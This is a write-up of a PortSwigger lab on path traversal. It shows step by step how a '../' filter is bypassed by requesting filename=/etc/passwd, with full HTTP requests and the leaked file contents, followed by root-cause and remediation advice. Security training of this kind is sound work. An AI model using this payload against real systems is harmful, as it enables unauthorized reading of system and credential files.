# File Path Traversal — Traversal Sequences Blocked with Absolute Path Bypass

**PortSwigger Web Security Academy** | Topic: Path Traversal | Difficulty: Practitioner
**Status:** ✅ Solved

---

## Lab Description

This lab contains a path traversal vulnerability in the display of product images. The application **blocks traversal sequences** (e.g. `../`) in the `filename` parameter, but it treats the supplied filename as being **relative to a default working directory** rather than confining it to that directory.

**Objective:** Retrieve the contents of `/etc/passwd`.

---

## Vulnerability Overview

Here the app's defence only targets *relative* traversal sequences — it strips or rejects `../`. But it never validates whether the resulting path is an **absolute path**. Most filesystem APIs, when given an absolute path (starting with `/` on Linux or `C:\` on Windows), will use that path directly and simply ignore the "default" base directory the developer intended.

So instead of trying to *escape* the base directory with `../`, the attacker just tells the filesystem API exactly where to look from the start:

```
filename=/etc/passwd
```

No traversal sequence is present at all, so the traversal filter never triggers — yet the underlying `fopen()`/`open()`-style call resolves `/etc/passwd` as an absolute path and reads it directly.

---

## Methodology

### 1. Identify the vulnerable parameter
Browsing the shop normally, product images are requested via:

```
GET /image?filename=47.jpg
```

Burp's Proxy history shows this pattern repeated for each product image (`47.jpg`, `65.jpg`, `56.jpg`, etc.), confirming `filename` is used to resolve a file server-side.

### 2. Intercept and send to Repeater
The image request was intercepted in Burp Proxy and sent to **Repeater**.

### 3. Confirm baseline behaviour
Sending the original request unmodified:

```http
GET /image?filename=47.jpg HTTP/2
Host: 0a5600c0036da6268193a80e0064006d.web-security-academy.net
Cookie: session=T57SJCSSVjlnkKl7bllW8fbdlYEakepA
```

returns a normal `200 OK` with `Content-Type: image/jpeg` and binary JPEG data — confirming the endpoint is live and the parameter is being used to fetch a file.

### 4. Bypass with an absolute path
Traversal sequences are blocked, so rather than trying to climb out of the working directory, the `filename` parameter was replaced with an **absolute path** straight to the target file:

```http
GET /image?filename=/etc/passwd HTTP/2
Host: 0a5600c0036da6268193a80e0064006d.web-security-academy.net
Cookie: session=T57SJCSSVjlnkKl7bllW8fbdlYEakepA
```

### 5. Result

The server returned a `200 OK` (still labelled `Content-Type: image/jpeg`, which the endpoint sets unconditionally) with the full contents of `/etc/passwd` in the response body:

```http
HTTP/2 200 OK
Content-Type: image/jpeg
X-Frame-Options: SAMEORIGIN
Content-Length: 2316

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
...
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
elmer:x:12099:12099::/home/elmer:/bin/bash
academy:x:10000:10000::/academy:/bin/bash
...
```

The lab was marked **Solved**.

---

## Root Cause

The application's traversal filter only checks for **relative** escape sequences (`../`), not for whether the resulting input is already an **absolute path**. Because the underlying file-read function accepts absolute paths and doesn't force them to be resolved relative to a fixed base directory, supplying one bypasses the intended containment entirely — no traversal sequence is ever needed.

---

## Evidence

| Step | Screenshot |
|---|---|
| Lab in "Not solved" state before the attack | `screenshots/01-lab-not-solved.png` |
| Burp Proxy intercept showing normal image requests (`filename=47.jpg`, etc.) | `screenshots/02-burp-proxy-intercept.png` |
| Repeater baseline request — normal `filename=47.jpg` returning a valid JPEG | `screenshots/03-baseline-request-normal-image.png` |
| Repeater request with `filename=/etc/passwd` disclosing the file | `screenshots/04-repeater-etc-passwd-bypass.png` |
| Lab in "Solved" state after the attack | `screenshots/05-lab-solved.png` |

---

## Remediation

- Never trust user input to resolve directly to a filesystem path — map a user-supplied identifier to an approved file server-side (allowlist), rather than passing the value straight into a file-read API.
- If a filename must be accepted, explicitly reject any input that resolves to an **absolute path** (starts with `/` or a drive letter), not just relative traversal sequences.
- Canonicalize the final resolved path (e.g. `realpath`) and verify it still falls **within** the intended base directory before opening the file — do this as a positive check, not just a blacklist of bad patterns.
- Run the application with a low-privilege service account and restrict filesystem permissions so sensitive files like `/etc/passwd` aren't readable even if traversal or absolute-path injection occurs.

---

## References

- [PortSwigger Web Security Academy – Path Traversal](https://portswigger.net/web-security/file-path-traversal)
- CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')
